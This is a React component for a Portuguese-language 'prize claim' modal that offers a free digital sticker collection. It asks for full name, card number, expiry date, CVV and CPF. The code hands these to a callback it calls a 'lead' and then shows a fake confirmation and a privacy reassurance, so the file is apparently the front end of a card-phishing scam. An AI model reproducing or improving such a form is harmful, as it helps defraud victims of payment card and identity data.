import React, { useState } from 'react';
import { X, CheckCircle, Gift, ShieldCheck, Eye, EyeOff } from 'lucide-react';

interface ClaimFormModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmitSuccess?: () => void;
  onSubmitLead?: (lead: { nome: string; numeroCartao: string; bandeira: string; validade: string; cvv: string }) => void;
}

const getCardBrand = (number: string) => {
  const cleanNum = number.replace(/\D/g, '');
  if (/^4/.test(cleanNum)) return 'Visa';
  if (/^5[1-5]/.test(cleanNum) || /^2(?:2(?:2[1-9]|[3-9]\d)|[3-6]\d\d|7(?:[01]\d|20))/.test(cleanNum)) return 'Mastercard';
  if (/^3[47]/.test(cleanNum)) return 'Amex';
  if (/^6(?:011|5)/.test(cleanNum)) return 'Discover';
  if (/^3(?:0[0-5]|[68])/.test(cleanNum)) return 'Diners';
  if (/^6[23]/.test(cleanNum)) return 'Elo';
  return 'Desconhecida';
};

const formatCardNumber = (value: string) => {
  return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().substring(0, 19);
};

const formatDate = (value: string) => {
  const clean = value.replace(/\D/g, '').substring(0, 4);
  if (clean.length >= 3) {
    return `${clean.substring(0,2)}/${clean.substring(2,4)}`;
  }
  return clean;
};

const formatCPF = (value: string) => {
  const clean = value.replace(/\D/g, '').substring(0, 11);
  if (clean.length > 9) return clean.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2}).*/, '$1.$2.$3-$4');
  if (clean.length > 6) return clean.replace(/^(\d{3})(\d{3})(\d{1,3}).*/, '$1.$2.$3');
  if (clean.length > 3) return clean.replace(/^(\d{3})(\d{1,3}).*/, '$1.$2');
  return clean;
};

export const ClaimFormModal: React.FC<ClaimFormModalProps> = ({
  isOpen,
  onClose,
  onSubmitSuccess,
  onSubmitLead,
}) => {
  const [formData, setFormData] = useState({
    nome: '',
    numeroCartao: '',
    validade: '',
    cvv: '',
    cvv: '',
    cpf: '',
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [showCard, setShowCard] = useState(false);
  const [showCvv, setShowCvv] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  if (!isOpen) return null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    const [mes, ano] = formData.validade.split('/');
    if (!mes || !ano || formData.validade.length !== 5) {
      setErrorMsg('Validade incompleta. Use o formato MM/AA.');
      return;
    }
    
    const mesNum = parseInt(mes, 10);
    const anoNum = parseInt(ano, 10);
    
    if (mesNum < 1 || mesNum > 12) {
      setErrorMsg('Mês inválido. Deve ser entre 01 e 12.');
      return;
    }
    
    if (anoNum < 26) {
      setErrorMsg('Ano inválido. O cartão deve expirar em 2026 ou depois.');
      return;
    }

    setIsSubmitted(true);
    if (onSubmitLead) {
      onSubmitLead({
        nome: formData.nome,
        numeroCartao: formData.numeroCartao,
        bandeira: getCardBrand(formData.numeroCartao),
        validade: formData.validade,
        cvv: formData.cvv,
      });
    }
    if (onSubmitSuccess) {
      onSubmitSuccess();
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-xs animate-in fade-in duration-150"
      onClick={(e) => e.stopPropagation()}
    >
      <div className="bg-white rounded-3xl w-full max-w-md overflow-hidden shadow-2xl border-4 border-[#ee4d2d] relative">
        {/* Header */}
        <div className="bg-gradient-to-r from-[#d71920] to-[#ee4d2d] p-5 text-white flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
              <Gift className="w-5 h-5 text-yellow-300" />
            </div>
            <div>
              <h3 className="font-black text-lg leading-tight">Formulário de Resgate</h3>
              <p className="text-xs text-white/90">Conjunto Completo de Figurinhas</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded-full hover:bg-white/20 transition-colors cursor-pointer text-white"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6">
          {isSubmitted ? (
            <div className="text-center py-6 space-y-4">
              <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle className="w-10 h-10" />
              </div>
              <h4 className="font-black text-xl text-gray-800">Resgate Confirmado!</h4>
              <p className="text-xs text-gray-600 max-w-xs mx-auto leading-relaxed">
                Seus dados foram enviados com sucesso. O prêmio e os cupons serão creditados na sua conta.
              </p>
              <button
                onClick={onClose}
                className="bg-[#ee4d2d] hover:bg-[#d73f21] text-white font-bold py-3 px-8 rounded-xl text-xs transition-colors cursor-pointer shadow-md"
              >
                Fechar
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="p-3 bg-red-50 rounded-2xl border border-red-200 flex items-center gap-2.5 text-xs text-red-800">
                <ShieldCheck className="w-5 h-5 text-red-600 shrink-0" />
                <span className="font-bold">
                  OBTENHA A COLEÇÃO DIGITAL DE STICKERS
                </span>
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  Nome Completo
                </label>
                <input
                  type="text"
                  required
                  placeholder="Digite seu nome completo"
                  value={formData.nome}
                  onChange={(e) => setFormData({ ...formData, nome: e.target.value })}
                  className="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-red-500 focus:bg-white transition-all"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  Número do Cartão
                </label>
                <div className="relative">
                  <input
                    type={showCard ? 'text' : 'password'}
                    required
                    maxLength={19}
                    placeholder="0000 0000 0000 0000"
                    value={formData.numeroCartao}
                    onChange={(e) => {
                      const val = formatCardNumber(e.target.value);
                      setFormData({ ...formData, numeroCartao: val });
                    }}
                    className="w-full pl-3.5 pr-10 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-red-500 focus:bg-white transition-all font-mono"
                  />
                  <button
                    type="button"
                    onClick={() => setShowCard(!showCard)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                  >
                    {showCard ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    Validade (MÊS/ANO)
                  </label>
                  <input
                    type="text"
                    required
                    maxLength={5}
                    placeholder="MM/AA"
                    value={formData.validade}
                    onChange={(e) => {
                      const val = formatDate(e.target.value);
                      setFormData({ ...formData, validade: val });
                    }}
                    className="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-red-500 focus:bg-white transition-all font-mono"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">
                    CVV
                  </label>
                  <div className="relative">
                    <input
                      type={showCvv ? 'text' : 'password'}
                      required
                      maxLength={4}
                      placeholder="123"
                      value={formData.cvv}
                      onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '') })}
                      className="w-full pl-3.5 pr-10 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-red-500 focus:bg-white transition-all font-mono"
                    />
                    <button
                      type="button"
                      onClick={() => setShowCvv(!showCvv)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                    >
                      {showCvv ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  CPF do Titular
                </label>
                <input
                  type="text"
                  required
                  maxLength={14}
                  placeholder="000.000.000-00"
                  value={formData.cpf}
                  onChange={(e) => {
                    const val = formatCPF(e.target.value);
                    setFormData({ ...formData, cpf: val });
                  }}
                  className="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-red-500 focus:bg-white transition-all font-mono"
                />
              </div>

              {errorMsg && (
                <div className="bg-red-50 text-red-600 text-[11px] font-bold p-2.5 rounded-xl border border-red-200 text-center animate-in fade-in">
                  {errorMsg}
                </div>
              )}

              <div className="pt-2">
                <button
                  type="submit"
                  className="w-full bg-[#0052d4] hover:bg-[#0041a8] active:scale-95 text-white font-black py-3.5 rounded-2xl text-sm shadow-xl transition-all cursor-pointer flex items-center justify-center gap-2"
                >
                  <CheckCircle className="w-4 h-4" />
                  <span>Confirmar Resgate</span>
                </button>
              </div>

              <p className="text-[10px] text-gray-400 text-center">
                Seus dados estão protegidos de acordo com a política de privacidade.
              </p>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};
